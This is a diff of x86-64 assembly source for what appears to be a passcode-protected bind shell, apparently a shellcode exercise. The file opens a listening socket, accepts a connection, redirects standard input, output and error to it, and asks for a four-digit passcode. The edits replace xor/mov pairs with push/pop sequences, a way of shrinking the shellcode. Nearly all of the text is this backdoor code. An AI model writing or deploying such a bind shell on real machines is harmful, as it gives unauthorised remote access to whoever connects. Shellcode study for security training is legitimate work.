@@ -21,15 +21,22 @@ _start:
         ; AF_INET = 2
         ; SOCK_STREAM = 1
         ; syscall number 41
-        xor eax, eax            ; init rax
-        mov al, 41              ; syscall
 
-        xor edi, edi
-        add di, 2
+        ;xor eax, eax            ; init rax
+        ;add al, 41              ; syscall
+	push byte 41
+	pop rax
 
-        xor esi, esi
-        inc rsi                 ; type
-        xor edx, edx            ; proto
+;        xor edi, edi
+ ;       add di, 2
+	push byte 2
+	pop rdi
+
+       ; xor esi, esi
+       ; inc rsi                 ; type
+	push byte 1
+	pop rsi
+	xor edx, edx            ; proto
         syscall
 
         ; socket descriptor returned in rax
@@ -55,28 +62,38 @@ _start:
         ; bind(sockfd, (struct sockaddr *)&server, sockaddr_len)
         ;      rdi      rsi                        rdx
         ; syscall number 49
-        xor eax, eax
-        mov al, 49                              ; syscall bind
+;        xor eax, eax
+ ;       mov al, 49                              ; syscall bind
+	push byte 49
+	pop rax
         ; rdi                                   ; sockfd
         mov rsi, rsp                            ; 0x0000 0000 5c11 0002
-        xor edx, edx
-        mov dl, 16                              ; length of ?
+	push byte 16
+	pop rdx
+;        xor edx, edx
+ ;       mov dl, 16                              ; length of ?
         syscall
 
 
         ; listen(sock, MAX_CLIENTS)
         ; syscall number 50
-        xor eax, eax
-        mov al, 50                              ; syscall listen
+;        xor eax, eax
+ ;       mov al, 50                              ; syscall listen
+	push byte 50
+	pop rax
         ; rdi                                   ; sockfd
-        xor esi, esi
-        add si, 2
+        ;xor esi, esi
+        ;add si, 2
+	push byte 2
+	pop rsi
         syscall
         ; new = accept(sock, (struct sockaddr *)&client, &sockaddr_len)
         ;              rdi    rsi                        rdx
         ; syscall number 43
-        xor eax, eax
-        mov al, 43                              ; syscall accept
+;        xor eax, eax
+ ;       mov al, 43                              ; syscall accept
+	push byte 43
+	pop rax
         sub rsp, 16                             ; ?
         ; rdi                                   ; sockfd
         mov rsi, rsp                            ; saving?
@@ -89,8 +106,10 @@ _start:
         mov r9, rax
 
         ; close parent
-        xor eax, eax
-        add al, 3
+;        xor eax, eax
+ ;       add al, 3
+	push byte 3
+	pop rax
         syscall
 
         ; duplicate sockets
@@ -99,24 +118,36 @@ _start:
         ;The dup2() system call performs the same task as dup(), but instead of using the lowest-numbered unused file descriptor, it uses the descriptor number spec
         ; -ified in newfd.  If the descriptor newfd was previously open, it is silently closed before being reused.
         ; dup2 (new, old)
-        xor eax, eax
-        mov al, 33
+;        xor eax, eax
+ ;       mov al, 33
+	push byte 33
+	pop rax
         mov rdi, r9             ; oldfd
-        xor rsi, rsi
+        xor rsi, rsi		; fd
         syscall
 
 
-        xor eax, eax
-        mov al, 33
+;        xor eax, eax
+ ;       mov al, 33
+	push byte 33
+	pop rax
         ; rdi
-        xor esi, esi            ; newfd = std out
-        inc rsi
+;        xor esi, esi            ; newfd = std out
+ ;       inc rsi
+	push byte 1
+	pop rsi			; fd
         syscall
-        xor eax, eax
-        mov al, 33
+
+
+;        xor eax, eax
+ ;       mov al, 33
+	push byte 33
+	pop rax
         ; rdi
-        xor esi, esi
-        add si, 2
+;        xor esi, esi
+ ;       add si, 2
+	push byte 2
+	pop rsi			; fd
         syscall
 
         ; ***************************************************************************************
@@ -126,30 +157,31 @@ _start:
         ; 6170207469676964
         ; 2034207265746e45
 
-        mov rax, 0x203a65646f637373
+        mov rax, 0x203a65646f637373	; buff....
         mov rbx, 0x6170207469676964
         mov rcx, 0x2034207265746e45
 
-        push rax
+        push rax			; LIFO...
         push rbx
         push rcx
 
-        xor eax, eax
-        xor edx, edx
-        mov al, 1
-        xor edx, edx
-        add dl, 1
-        mov rsi, rsp
-        mov dl, 25                      ; $ echo "Enter 4 digit passcode: " | wc = 25
-        syscall
+	push byte 1
+	pop rax				; write syscall 
+	mov rdi, r9			; fd
+        mov rsi, rsp			; buffer
+	push byte 25			; $ echo "Enter 4 digit passcode: " | wc = 25
+	pop rdx
+	syscall
         ; *******************************************************
 
         ; *****get passcode **************************************
         xor eax, eax                    ; you can use read 0 | recvfrom 45 | recvmsg 47
         mov rdi, r9                     ; sockfd
         mov rsi, rsp                    ; buffer - put it on the stack
-        xor rdx, rdx
-        mov dl, 4                       ; len
+        ;xor rdx, rdx
+        ;mov dl, 4                       ; len
+	push byte 4
+	pop rdx				; len
 ;       the items below are for using recvfrom | recvmsg
 ;       xor rcx, rcx                    ; flags
 ;       xor r8, r8                      ; null
@@ -165,8 +197,10 @@ _start:
 
 _exit:
         ; _exit if wrong passcode ; alternatively, continue to ask for passcode
-        xor eax, eax
-        mov al, 60
+;        xor eax, eax
+ ;       mov al, 60
+	push byte 60
+	pop rax
         xor edi, edi
         syscall
         ; *******************************************************
